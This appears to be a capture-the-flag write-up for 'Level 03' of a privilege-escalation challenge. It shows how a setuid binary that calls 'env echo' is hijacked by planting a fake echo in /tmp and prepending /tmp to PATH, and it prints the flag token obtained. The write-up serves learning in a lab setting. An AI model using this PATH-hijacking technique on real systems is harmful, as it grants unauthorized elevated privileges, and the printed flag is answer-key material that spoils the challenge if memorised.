# Level 03

A binary file can be found in the user directory.

```bash
ls -l
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

We can see that it has special permissions. These permissions mean that it is a **setuid** and **setgid** binary. Any call made by a setuid binary will use that uid permissions for its calls. Using "ltrace ./level03" we can see that it calls "/usr/bin/env echo".

By writing a fake `echo` binary and changing the PATH to force its use we can make any calls we like with the permissions of the uid set in the binary. Some info [here](https://www.riccardoancarani.it/exploting-setuid-setgid-binaries/).

```bash
echo '/bin/getflag' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
# Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

